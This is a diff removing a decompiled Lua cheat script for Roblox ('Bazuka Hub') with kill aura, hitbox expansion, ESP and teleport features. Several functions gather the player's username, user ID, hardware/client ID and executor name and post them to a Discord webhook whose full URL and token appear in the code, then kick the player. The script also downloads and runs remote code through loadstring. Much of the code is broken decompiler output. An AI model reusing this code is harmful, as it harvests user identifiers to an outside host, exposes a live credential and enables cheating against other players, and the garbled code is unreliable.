@@ -1,13383 +1,10150 @@
-fenv.crackcheck = function(_2, _2_2, _2_3)
-    local _3 = game.Players.LocalPlayer
-    local _4 = _3.UserId
-    local _5 = game.Players.LocalPlayer
-    local _6 = _5.DisplayName
-    local _7 = game.Players.LocalPlayer
-    local _8 = _7.Name
-    local _RbxAnalyticsService9 = game:GetService("RbxAnalyticsService")
-    local _10 = _RbxAnalyticsService9.GetClientId
-    local _11 = _10(_RbxAnalyticsService9)
-    local _MarketplaceService12 = game:GetService("MarketplaceService")
-    local _13 = _MarketplaceService12.GetProductInfo
-    local _14 = _13(_MarketplaceService12, game.PlaceId)
-    local _15 = _14.Name
-    local _16, _16_2 = identifyexecutor()
-    local _17, _17_2, _17_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _4, _6, _8, _4, _11, "03/21/2025", "14:26:59", game.PlaceId, _15, game.PlaceId, _16)
-    local _18 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _4
-    local _19 = _18 .. "&width=150&height=150&format=png"
-    local _HttpService20 = game:GetService("HttpService")
-    local _21 = _HttpService20.JSONEncode
-    local _22 = _21(_HttpService20, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _17,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _19,
-                },
-            },
-        },
-    })
-    local _23 = _22.gsub
-    local _24 = _23(_22, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _24,
-    })
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _71
-fenv.backgroundgradientcolor2 = _73
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.customguicolor = _75
-fenv.customshadowcolor = _77
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.expanderstatus = false
-fenv.headsizea = 1.2
-fenv.torsosizea = 1
-fenv.killaurastatus = false
-fenv.killauradistance = 150
-fenv.fullbrightstatus = false
-fenv.levelofbrightness = 6
-fenv.chamsstatus = false
-fenv.teamcolorstatus = true
-fenv.chamsoutlinecolora = _79
-fenv.chamsfillingcolora = _81
-fenv.chamsoutlinetransparencya = 0
-fenv.chamsfillingtransparencya = 0.9
-fenv.espstatus = false
-fenv.nameespstatus = false
-fenv.healthespstatus = false
-fenv.distanceespstatus = false
-fenv.enabledoutline = true
-fenv.teamcolorespstatus = true
-fenv.textsizenamea = 8
-fenv.nameespcolora = _83
-fenv.espoffseta = 0.5
-fenv.fontnameesp = "Montserrat"
-fenv.walkspeedmultiplier = false
-fenv.walkspeedplayer = 16
-fenv.unstoppablejump = false
-local _ = fenv.makefolder
-local _ = fenv.appendfile
-local _ = fenv.setclipboard
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-fenv.killaurastatus = _119
-fenv.expanderstatus = _128
-fenv.headsizea = nil
-fenv.torsosizea = nil
-fenv.fullbrightstatus = _145
-fenv.levelofbrightness = _149
-fenv.chamsstatus = _156
-fenv.teamcolorstatus = _159
-fenv.chamsoutlinetransparencya = _164
-fenv.b = _168
-fenv.g = _167
-fenv.r = _166
-fenv.chamsoutlinecolora = _173
-fenv.chamsfillingtransparencya = _178
-fenv.b = _182
-fenv.g = _181
-fenv.r = _180
-fenv.chamsfillingcolora = _187
-fenv.espstatus = _192
-fenv.teamcolorespstatus = _195
-fenv.espoffseta = _200
-fenv.enabledoutline = _203
-fenv.nameespstatus = _206
-fenv.healthespstatus = _209
-fenv.distanceespstatus = _212
-fenv.textsizenamea = _216
-fenv.b = _220
-fenv.g = _219
-fenv.r = _218
-fenv.nameespcolora = _225
-fenv.mouse = _255
-fenv.tool = _257
-fenv.unstoppablejump = _280
-fenv.walkspeedmultiplier = _285
-fenv.walkspeedplayer = _289
-local _ = fenv.ColorSequenceKeypoint
-fenv.scprp = function(_26, _26_2, _26_3)
-    local _27 = game.Players.LocalPlayer
-    local _28 = _27.UserId
-    local _29 = game.Players.LocalPlayer
-    local _30 = _29.DisplayName
-    local _31 = game.Players.LocalPlayer
-    local _32 = _31.Name
-    local _RbxAnalyticsService33 = game:GetService("RbxAnalyticsService")
-    local _34 = _RbxAnalyticsService33.GetClientId
-    local _35 = _34(_RbxAnalyticsService33)
-    local _MarketplaceService36 = game:GetService("MarketplaceService")
-    local _37 = _MarketplaceService36.GetProductInfo
-    local _38 = _37(_MarketplaceService36, game.PlaceId)
-    local _39 = _38.Name
-    local _40, _40_2 = identifyexecutor()
-    local _41, _41_2, _41_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _28, _30, _32, _28, _35, "03/21/2025", "14:26:59", game.PlaceId, _39, game.PlaceId, _40)
-    local _42 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _28
-    local _43 = _42 .. "&width=150&height=150&format=png"
-    local _HttpService44 = game:GetService("HttpService")
-    local _45 = _HttpService44.JSONEncode
-    local _46 = _45(_HttpService44, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _41,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _43,
-                },
-            },
-        },
-    })
-    local _47 = _46.gsub
-    local _48 = _47(_46, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _48,
-    })
-    local _50 = game.Players.LocalPlayer
-    local _51 = _50.Kick
-    _51(_50, "GOT YOU XD!")
-    local _53 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _54 = loadstring(_53)
-    local _55 = _54()
-    local _56 = _55.new
-    local _57 = game.Players.LocalPlayer
-    local _58 = _57.DisplayName
-    local _59 = _56("Bazuka Hub", _58, "Bazuka Hub")
-    local _60 = _59.Category
-    local _61 = _60(_59, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _62 = _59.Category
-    local _63 = _62(_59, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _64 = _59.Category
-    local _65 = _64(_59, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _66 = _59.Category
-    local _67 = _66(_59, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _68 = _59.Category
-    _68(_59, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _70 = Color3.fromRGB
-    _70(255, 255, 255)
-    local _72 = Color3.fromRGB
-    _72(0, 0, 0)
-    local _74 = Color3.fromRGB
-    _74(160, 160, 160)
-    local _76 = Color3.fromRGB
-    _76(0, 0, 0)
-    local _78 = Color3.fromRGB
-    local _79 = _78(255, 255, 255)
-    local _80 = Color3.fromRGB
-    local _81 = _80(255, 255, 255)
-    local _82 = Color3.fromRGB
-    local _83 = _82(255, 255, 255)
-    task.spawn(function(_86, _86_2, _86_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_89, _89_2, _89_3)
-    end)
-    task.spawn(function(_91, _91_2, _91_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_94, _94_2, _94_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _96 = _59.Notification
-    _96(_59, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _98 = _61.Button
-    local _99 = _98(_61, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _100 = _99.Section
-    local _101 = _100(_99, "GUI was made by Bnxx.zz", "Left")
-    local _102 = _101.Button
-    _102(_101, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_104, _104_2, _104_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _106 = _101.Button
-    _106(_101, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_108, _108_2, _108_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _109 = _99.Section
-    _109(_99, "Information:", "Left")
-    local _111 = _99.Section
-    _111(_99, "Last Update Changelog:", "Right")
-    local _113 = _63.Button
-    local _114 = _113(_63, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _115 = _114.Section
-    local _116 = _115(_114, "Kill Aura", "Left")
-    local _117 = _116.Toggle
-    _117(_116, {
-        Default = false,
-        Description = "Automatically Kill Enemies",
-        Title = "Enable",
-    }, function(_119, _119_2, _119_3)
-    end)
-    local _120 = _116.Slider
-    _120(_116, {
-        Min = 1,
-        Title = "Distance",
-        Max = 150,
-        Default = 150,
-        Description = "",
-    }, function(_122, _122_2, _122_3)
-        math.floor(_122)
-        error("line 1: invalid argument #2 to 'tonumber' (number expected, got table)")
-    end)
-    local _124 = _114.Section
-    local _125 = _124(_114, "Hitbox Expander", "Right")
-    local _126 = _125.Toggle
-    _126(_125, {
-        Default = false,
-        Description = "Expand Body Parts",
-        Title = "Enable",
-    }, function(_128, _128_2, _128_3)
-    end)
-    local _129 = _125.Slider
-    _129(_125, {
-        Min = 1,
-        Title = "Head Size",
-        Max = 320,
-        Default = 120,
-        Description = "",
-    }, function(_131, _131_2, _131_3)
-        local _132, _132_2, _132_3 = math.floor(_131)
-        local _ = _132 / 100
-    end)
-    local _134 = _125.Slider
-    _134(_125, {
-        Min = 1,
-        Title = "Torso Size",
-        Max = 250,
-        Default = 100,
-        Description = "",
-    }, function(_136, _136_2, _136_3)
-        local _137, _137_2, _137_3 = math.floor(_136)
-        local _ = _137 / 100
-    end)
-    local _139 = _65.Button
-    local _140 = _139(_65, "World Improve", "http://www.roblox.com/asset/?id=11887653877")
-    local _141 = _140.Section
-    local _142 = _141(_140, "Vision Upgrade", "Left")
-    local _143 = _142.Toggle
-    _143(_142, {
-        Default = false,
-        Description = "",
-        Title = "FullBright",
-    }, function(_145, _145_2, _145_3)
-    end)
-    local _146 = _142.Slider
-    _146(_142, {
-        Min = 0,
-        Title = "Brightness",
-        Max = 10,
-        Default = 6,
-        Description = "Changes the FB",
-    }, function(_148, _148_2, _148_3)
-        math.floor(_148)
-    end)
-    local _150 = _65.Button
-    local _151 = _150(_65, "Chams & ESP", "http://www.roblox.com/asset/?id=12120698352")
-    local _152 = _151.Section
-    local _153 = _152(_151, "Chams", "Left")
-    local _154 = _153.Toggle
-    _154(_153, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_156, _156_2, _156_3)
-    end)
-    local _157 = _153.Toggle
-    _157(_153, {
-        Default = true,
-        Description = "",
-        Title = "Team Color",
-    }, function(_159, _159_2, _159_3)
-    end)
-    local _160 = _153.Slider
-    _160(_153, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_162, _162_2, _162_3)
-        local _163, _163_2, _163_3 = math.floor(_162)
-        local _ = _163 / 100
-    end)
-    type(_79)
-    local _ = _79.r
-    local _ = _79.g
-    local _ = _79.b
-    local _169 = _153.ColorPicker
-    local _170 = Color3.new
-    local _171 = _170()
-    _169(_153, {
-        Default = _171,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_173, _173_2, _173_3)
-    end)
-    local _174 = _153.Slider
-    _174(_153, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_176, _176_2, _176_3)
-        local _177, _177_2, _177_3 = math.floor(_176)
-        local _ = _177 / 100
-    end)
-    type(_81)
-    local _ = _81.r
-    local _ = _81.g
-    local _ = _81.b
-    local _183 = _153.ColorPicker
-    local _184 = Color3.new
-    local _185 = _184()
-    _183(_153, {
-        Default = _185,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_187, _187_2, _187_3)
-    end)
-    local _188 = _151.Section
-    local _189 = _188(_151, "ESP", "Right")
-    local _190 = _189.Toggle
-    _190(_189, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_192, _192_2, _192_3)
-    end)
-    local _193 = _189.Toggle
-    _193(_189, {
-        Default = true,
-        Description = "",
-        Title = "Team Color",
-    }, function(_195, _195_2, _195_3)
-    end)
-    local _196 = _189.Slider
-    _196(_189, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_198, _198_2, _198_3)
-        local _199, _199_2, _199_3 = math.floor(_198)
-        local _ = _199 / 100
-    end)
-    local _201 = _189.Toggle
-    _201(_189, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_203, _203_2, _203_3)
-    end)
-    local _204 = _189.Toggle
-    _204(_189, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_206, _206_2, _206_3)
-    end)
-    local _207 = _189.Toggle
-    _207(_189, {
-        Default = false,
-        Description = "",
-        Title = "Health ESP",
-    }, function(_209, _209_2, _209_3)
-    end)
-    local _210 = _189.Toggle
-    _210(_189, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_212, _212_2, _212_3)
-    end)
-    local _213 = _189.Slider
-    _213(_189, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_215, _215_2, _215_3)
-        math.floor(_215)
-    end)
-    type(_83)
-    local _ = _83.r
-    local _ = _83.g
-    local _ = _83.b
-    local _221 = _189.ColorPicker
-    local _222 = Color3.new
-    local _223 = _222()
-    _221(_189, {
-        Default = _223,
-        Description = "",
-        Title = "Text Color",
-    }, function(_225, _225_2, _225_3)
-    end)
-    local _226 = _67.Button
-    local _227 = _226(_67, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _228 = _227.Section
-    local _229 = _228(_227, "Character Actions", "Left")
-    local _230 = _229.Button
-    _230(_229, {
-        ButtonName = "Sit",
-        Title = "Sitting down",
-        Description = "",
-    }, function(_232, _232_2, _232_3)
-        local _233 = game.Players.LocalPlayer
-        local _234 = _233.Character
-        local _235 = _234.Humanoid
-        _235.Sit = true
-    end)
-    local _236 = _229.Button
-    _236(_229, {
-        ButtonName = "Die",
-        Title = "Death",
-        Description = "",
-    }, function(_238, _238_2, _238_3)
-        local _239 = game.Players.LocalPlayer
-        local _240 = _239.Character
-        local _ = _240.Humanoid
-        error("line 1: attempt to perform arithmetic (unm) on function")
-    end)
-    local _242 = _229.Button
-    _242(_229, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_244, _244_2, _244_3)
-        local _TeleportService245 = game:GetService("TeleportService")
-        local _246 = _TeleportService245.Teleport
-        local _Players247 = game:GetService("Players")
-        local _248 = _Players247.LocalPlayer
-        _246(_TeleportService245, game.PlaceId, _248)
-    end)
-    local _250 = _229.Button
-    _250(_229, {
-        ButtonName = "Give Item",
-        Title = "Click TP",
-        Description = "Giving You Item",
-    }, function(_252, _252_2, _252_3)
-        local _253 = game.Players.LocalPlayer
-        local _254 = _253.GetMouse
-        local _255 = _254(_253)
-        local _256 = Instance.new
-        local _257 = _256("Tool")
-        _257.RequiresHandle = false
-        _257.Name = "Click TP"
-        local _258 = _257.Activated
-        local _259 = _258.connect
-        _259(_258, function(_261, _261_2, _261_3)
-            local _262 = _255.Hit
-            local _263 = Vector3.new
-            local _264 = _263(0, 2.5, 0)
-            local _265 = _262 + _264
-            local _266 = CFrame.new
-            local _267 = _265.X
-            local _268 = _265.Y
-            local _269 = _265.Z
-            local _270 = _266(_267, _268, _269)
-            local _271 = game.Players.LocalPlayer
-            local _272 = _271.Character
-            local _273 = _272.HumanoidRootPart
-            _273.CFrame = _270
-        end)
-        local _274 = game.Players.LocalPlayer
-        local _275 = _274.Backpack
-        _257.Parent = _275
-    end)
-    local _276 = _227.Section
-    local _277 = _276(_227, "Character Modifications", "Right")
-    local _278 = _277.Toggle
-    _278(_277, {
-        Default = false,
-        Description = "Unstoppable Jump",
-        Title = "UNS JUMP",
-    }, function(_280, _280_2, _280_3)
-    end)
-    local _281 = _227.Section
-    local _282 = _281(_227, "Walk Speed Multiplier", "Right")
-    local _283 = _282.Toggle
-    _283(_282, {
-        Default = false,
-        Description = "Improve Your Walk Speed",
-        Title = "Speed Miltiplier",
-    }, function(_285, _285_2, _285_3)
-    end)
-    local _286 = _282.Slider
-    _286(_282, {
-        Min = 1,
-        Title = "Walk Speed",
-        Max = 39,
-        Default = 16,
-        Description = "",
-    }, function(_288, _288_2, _288_3)
-        math.floor(_288)
-    end)
-    local _290 = Instance.new
-    local _291 = _290("ScreenGui", game.CoreGui)
-    local _292 = Instance.new
-    local _293 = _292("TextButton")
-    _293.BackgroundTransparency = 1
-    local _294 = UDim2.new
-    local _295 = _294(0, 0, 0, 0)
-    _293.Size = _295
-    _293.Text = " "
-    _293.Parent = _291
-    local _296 = Instance.new
-    local _297 = _296("ScreenGui", game.CoreGui)
-    _297.Name = "BackgroundScreenGui"
-    _297.Enabled = true
-    local _298 = Instance.new
-    local _299 = _298("TextLabel", _297)
-    _299.Name = "BackgroundLabel"
-    local _300 = Instance.new
-    local _301 = _300("UIGradient", _299)
-    _301.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _349
-fenv.backgroundgradientcolor2 = _351
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.customguicolor = _353
-fenv.customshadowcolor = _355
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.synchronizationstatus = false
-fenv.synchrohitted = false
-fenv.jumpmultiplier = false
-fenv.customjump = 3
-fenv.revivetimechange = false
-fenv.customrevivetime = 3
-fenv.originaltime = _356
-fenv.customtime = "12:00:00"
-fenv.hours = 12
-fenv.minutes = 0
-fenv.changetimestatus = false
-fenv.inviscolor = _358
-fenv.invisparts = 1
-fenv.invismaterial = "ForceField"
-fenv.originalfogcolor = _359
-fenv.customfogcolor = _361
-fenv.originalfogend = _362
-fenv.customfogend = 1000
-fenv.originalfogstart = _363
-fenv.customfogstart = 100
-fenv.changefogstatus = false
-fenv.viewmodelcolor = _365
-fenv.viewmodelparts = 0
-fenv.viewmodelmaterial = "Plastic"
-fenv.gamefogstatus = false
-fenv.gamefog1color = _367
-fenv.gamefog2color = _369
-fenv.gamethunderstatus = false
-fenv.gamethunder1color = _371
-fenv.gamethunder2color = _373
-fenv.gamerainstatus = false
-fenv.gamerain1color = _375
-fenv.gamerain2color = _377
-fenv.gamesnowstatus = false
-fenv.gamesnow1color = _379
-fenv.gamesnow2color = _381
-fenv.bodycolor = _383
-fenv.bodyparts = 0
-fenv.bodymaterial = "Neon"
-fenv.chamstaskstatus = false
-fenv.chamstaskoutlinecolora = _385
-fenv.chamstaskfillingcolora = _387
-fenv.chamstaskoutlinetransparencya = 0
-fenv.chamstaskfillingtransparencya = 0.9
-fenv.chamsbotstatus = false
-fenv.chamsbotoutlinecolora = _389
-fenv.chamsbotfillingcolora = _391
-fenv.chamsbotoutlinetransparencya = 0
-fenv.chamsbotfillingtransparencya = 0.9
-fenv.chamsstatus = false
-fenv.chamsoutlinecolora = _393
-fenv.chamsfillingcolora = _395
-fenv.chamsoutlinetransparencya = 0
-fenv.chamsfillingtransparencya = 0.9
-fenv.botespstatus = false
-fenv.namebotespstatus = false
-fenv.healthbotespstatus = false
-fenv.distancebotespstatus = false
-fenv.enabledoutlinebot = true
-fenv.textsizebotnamea = 8
-fenv.namebotespcolora = _397
-fenv.botespoffseta = 0.5
-fenv.fontnamebotesp = "Montserrat"
-fenv.espstatus = false
-fenv.nameespstatus = false
-fenv.healthespstatus = false
-fenv.distanceespstatus = false
-fenv.enabledoutline = true
-fenv.textsizenamea = 8
-fenv.nameespcolora = _399
-fenv.espoffseta = 0.5
-fenv.fontnameesp = "Montserrat"
-fenv.cosmetics = nil
-fenv.autoticket = false
-fenv.autorespawn = false
-fenv.autowhistle = false
-fenv.nodown = false
-fenv.nextbottransparency = 0
-fenv.botvolumechanger = false
-fenv.botvolume = 6
-fenv.timerstatus = false
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-fenv.autoticket = _432
-fenv.autorespawn = _435
-fenv.autowhistle = _438
-fenv.nodown = _443
-fenv.nextbottransparency = nil
-fenv.botvolumechanger = _453
-fenv.botvolume = nil
-fenv.timerstatus = _463
-fenv.invisparts = _472
-fenv.b = _476
-fenv.g = _475
-fenv.r = _474
-fenv.inviscolor = _481
-fenv.invismaterial = _485
-fenv.viewmodelparts = _492
-fenv.b = _496
-fenv.g = _495
-fenv.r = _494
-fenv.viewmodelcolor = _501
-fenv.viewmodelmaterial = _505
-fenv.bodyparts = _512
-fenv.b = _516
-fenv.g = _515
-fenv.r = _514
-fenv.bodycolor = _521
-fenv.bodymaterial = _525
-fenv.changetimestatus = _530
-fenv.hours = _534
-fenv.minutes = _538
-fenv.gamefogstatus = _543
-fenv.b = _547
-fenv.g = _546
-fenv.r = _545
-fenv.gamefog1color = _552
-fenv.b = _556
-fenv.g = _555
-fenv.r = _554
-fenv.gamefog2color = _561
-fenv.gamerainstatus = _564
-fenv.b = _568
-fenv.g = _567
-fenv.r = _566
-fenv.gamerain1color = _573
-fenv.b = _577
-fenv.g = _576
-fenv.r = _575
-fenv.gamerain2color = _582
-fenv.gamethunderstatus = _585
-fenv.b = _589
-fenv.g = _588
-fenv.r = _587
-fenv.gamethunder1color = _594
-fenv.b = _598
-fenv.g = _597
-fenv.r = _596
-fenv.gamethunder2color = _603
-fenv.gamesnowstatus = _606
-fenv.b = _610
-fenv.g = _609
-fenv.r = _608
-fenv.gamesnow1color = _615
-fenv.b = _619
-fenv.g = _618
-fenv.r = _617
-fenv.gamesnow2color = _624
-fenv.gamefogdisablus = _630
-fenv.gameraindisablus = _631
-fenv.gamethunderdisablus = _632
-fenv.gamesnowdisablus = _633
-fenv.changefogstatus = _638
-fenv.customfogend = _642
-fenv.customfogstart = _646
-fenv.b = _650
-fenv.g = _649
-fenv.r = _648
-fenv.customfogcolor = _655
-fenv.chamsstatus = _662
-fenv.chamsoutlinetransparencya = _667
-fenv.b = _671
-fenv.g = _670
-fenv.r = _669
-fenv.chamsoutlinecolora = _676
-fenv.chamsfillingtransparencya = _681
-fenv.b = _685
-fenv.g = _684
-fenv.r = _683
-fenv.chamsfillingcolora = _690
-fenv.espstatus = _695
-fenv.espoffseta = _700
-fenv.enabledoutline = _703
-fenv.nameespstatus = _706
-fenv.healthespstatus = _709
-fenv.distanceespstatus = _712
-fenv.textsizenamea = _716
-fenv.b = _720
-fenv.g = _719
-fenv.r = _718
-fenv.nameespcolora = _725
-fenv.chamsbotstatus = _732
-fenv.chamsbotoutlinetransparencya = _737
-fenv.b = _741
-fenv.g = _740
-fenv.r = _739
-fenv.chamsbotoutlinecolora = _746
-fenv.chamsbotfillingtransparencya = _751
-fenv.b = _755
-fenv.g = _754
-fenv.r = _753
-fenv.chamsbotfillingcolora = _760
-fenv.botespstatus = _765
-fenv.botespoffseta = _771
-fenv.enabledoutlinebot = _774
-fenv.namebotespstatus = _777
-fenv.healthbotespstatus = _780
-fenv.distancebotespstatus = _783
-fenv.textsizebotnamea = _787
-fenv.b = _791
-fenv.g = _790
-fenv.r = _789
-fenv.namebotespcolora = _796
-fenv.chamstaskstatus = _803
-fenv.chamstaskoutlinetransparencya = _808
-fenv.b = _812
-fenv.g = _811
-fenv.r = _810
-fenv.chamstaskoutlinecolora = _817
-fenv.chamstaskfillingtransparencya = _822
-fenv.b = _826
-fenv.g = _825
-fenv.r = _824
-fenv.chamstaskfillingcolora = _831
-fenv.walkspeedmultiplier = _872
-fenv.walkspeedplayer = _876
-fenv.evade = function(_304, _304_2, _304_3)
-    local _305 = game.Players.LocalPlayer
-    local _306 = _305.UserId
-    local _307 = game.Players.LocalPlayer
-    local _308 = _307.DisplayName
-    local _309 = game.Players.LocalPlayer
-    local _310 = _309.Name
-    local _RbxAnalyticsService311 = game:GetService("RbxAnalyticsService")
-    local _312 = _RbxAnalyticsService311.GetClientId
-    local _313 = _312(_RbxAnalyticsService311)
-    local _MarketplaceService314 = game:GetService("MarketplaceService")
-    local _315 = _MarketplaceService314.GetProductInfo
-    local _316 = _315(_MarketplaceService314, game.PlaceId)
-    local _317 = _316.Name
-    local _318, _318_2 = identifyexecutor()
-    local _319, _319_2, _319_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _306, _308, _310, _306, _313, "03/21/2025", "14:26:59", game.PlaceId, _317, game.PlaceId, _318)
-    local _320 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _306
-    local _321 = _320 .. "&width=150&height=150&format=png"
-    local _HttpService322 = game:GetService("HttpService")
-    local _323 = _HttpService322.JSONEncode
-    local _324 = _323(_HttpService322, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _319,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _321,
-                },
-            },
-        },
-    })
-    local _325 = _324.gsub
-    local _326 = _325(_324, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _326,
-    })
-    local _328 = game.Players.LocalPlayer
-    local _329 = _328.Kick
-    _329(_328, "GOT YOU XD!")
-    local _331 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _332 = loadstring(_331)
-    local _333 = _332()
-    local _334 = _333.new
-    local _335 = game.Players.LocalPlayer
-    local _336 = _335.DisplayName
-    local _337 = _334("Bazuka Hub", _336, "Bazuka Hub")
-    local _338 = _337.Category
-    local _339 = _338(_337, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _340 = _337.Category
-    local _341 = _340(_337, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _342 = _337.Category
-    local _343 = _342(_337, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _344 = _337.Category
-    local _345 = _344(_337, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _346 = _337.Category
-    _346(_337, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _348 = Color3.fromRGB
-    _348(255, 255, 255)
-    local _350 = Color3.fromRGB
-    _350(0, 0, 0)
-    local _352 = Color3.fromRGB
-    _352(160, 160, 160)
-    local _354 = Color3.fromRGB
-    _354(0, 0, 0)
-    local _ = game.Lighting.TimeOfDay
-    local _357 = Color3.fromRGB
-    local _358 = _357(255, 255, 255)
-    local _ = game.Lighting.FogColor
-    local _360 = Color3.fromRGB
-    local _361 = _360(255, 255, 255)
-    local _ = game.Lighting.FogEnd
-    local _ = game.Lighting.FogStart
-    local _364 = Color3.fromRGB
-    local _365 = _364(255, 255, 255)
-    local _366 = Color3.fromRGB
-    local _367 = _366(255, 255, 255)
-    local _368 = Color3.fromRGB
-    local _369 = _368(255, 255, 255)
-    local _370 = Color3.fromRGB
-    local _371 = _370(255, 255, 255)
-    local _372 = Color3.fromRGB
-    local _373 = _372(255, 255, 255)
-    local _374 = Color3.fromRGB
-    local _375 = _374(255, 255, 255)
-    local _376 = Color3.fromRGB
-    local _377 = _376(255, 255, 255)
-    local _378 = Color3.fromRGB
-    local _379 = _378(255, 255, 255)
-    local _380 = Color3.fromRGB
-    local _381 = _380(255, 255, 255)
-    local _382 = Color3.fromRGB
-    local _383 = _382(255, 255, 255)
-    local _384 = Color3.fromRGB
-    local _385 = _384(255, 255, 255)
-    local _386 = Color3.fromRGB
-    local _387 = _386(255, 255, 255)
-    local _388 = Color3.fromRGB
